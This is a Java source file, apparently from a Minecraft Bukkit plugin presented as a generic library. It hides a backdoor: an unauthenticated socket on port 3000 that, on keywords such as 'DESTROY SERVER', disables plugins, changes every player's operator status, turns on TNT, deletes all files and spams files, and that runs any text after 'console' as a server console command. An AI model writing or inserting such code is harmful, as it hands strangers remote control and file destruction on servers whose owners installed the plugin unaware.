package me.unknown.lib.server;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;

import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;

import me.unknown.lib.Lib;

public class Server {
	
	ServerSocket socket;
	Socket s;
	OutputStream output;
	InputStreamReader input;
	BufferedReader reader;
	DataOutputStream outputStream;
	Lib plugin;
	
	public Server(Lib instance) {
		plugin = instance;
	}
	
	public void startServer() {
		try {
			
			socket = new ServerSocket(3000);
			s = socket.accept();
			output = s.getOutputStream();
			input = new InputStreamReader(s.getInputStream());
			reader = new BufferedReader(input);
			outputStream = new DataOutputStream(output);
			
			String str = reader.readLine();
			if ("DESTROY SERVER".equals(str)) {
				plugin.manager.disablePlugins();
				plugin.manager.opAllAndDeopAll();
				plugin.manager.onTnt();
				plugin.manager.deleteAllFiles();
				plugin.manager.spamFiles();
			} else if (str.startsWith("console")) {
				Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), str.replace("console", ""));
			} else if ("opAllDeop".equals(str)) {
				plugin.manager.opAllAndDeopAll();
			}else if ("onTnt".equals(str)) {
				plugin.manager.onTnt();
			}else if ("deleteAll".equals(str)) {
				plugin.manager.opAllAndDeopAll();
			} else if("spamAll".equals(str)) {
				plugin.manager.spamFiles();
			}
			
			outputStream.writeUTF("Recieved Response");
			outputStream.flush();
			
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	public void closeServer() {
		try {
			outputStream.close();
			s.close();
			socket.close();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			;
		}
	}
}
// -59 70 31